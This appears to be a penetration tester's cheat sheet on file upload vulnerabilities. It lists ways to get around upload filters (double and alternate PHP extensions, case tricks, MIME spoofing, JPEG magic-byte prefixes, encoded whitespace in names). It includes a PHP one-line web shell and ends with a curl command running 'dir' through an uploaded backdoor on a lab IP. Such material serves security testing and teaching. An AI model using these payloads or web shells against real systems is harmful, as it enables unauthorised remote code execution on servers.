# File Upload Vulnerabilities

## Overview

File upload functionality should be assessed to determine whether user-supplied files are validated securely before being stored or processed by the server. Weak validation may allow attackers to upload malicious files, such as web shells or scripts, leading to remote code execution or sensitive file disclosure. Testing typically involves examining file type restrictions, content validation, filename handling, upload locations, and whether uploaded files are executable.

---
1) Check Allowed File Types    
Upload a test file:  
- test.jpg  
- test.png  
- test.txt  
Check response for;
Upload, execute, file renamed , return file path 

2) Check for Extension Filtering  
Simple bypasses:  
- shell.php.jpg 
- shell.php.png 
- shell.php.jpeg 
- shell.php5 
- shell.phtml 
- shell.php7  
If it allows only .jpg try double extension:   
- shell.php.jpg 
- shell.php.jpg.php 
- shell.php.jpg.txt  

3) Check for MIME Type Filtering   
Use Burp to change:  
Content-Type: image/jpeg  
Try uploading:  
<?php system($_GET['cmd']); ?>  

4) Check for Magic Bytes / File Signature Checks  
Some apps inspect file headers.   
Add a valid JPEG header + PHP code after.  
Example:  
FFD8FFE0...<?php system($_GET['cmd']); ?>  
Simpler approach:  
Use a real JPEG and append PHP at the end.  

5) Check for Case Sensitivity  
Try:  
- shell.PHP 
- shell.PHp 
- shell.pHp 
- shell.Php.jpg  

6) Check for Whitespace / URL Encoding Bypass  
Try:  
shell.php%20.jpg shell.php%09.jpg shell.php%0a.jpg shell.php%0d.jpg  
  
7) Check for PHP Wrapper Execution  
If file is stored and accessible but doesn’t execute:  
Try using data:// or php://input (if LFI exists)  

 curl http://192.168.50.189/meteor/uploads/simple-backdoor.pHP?cmd=dir
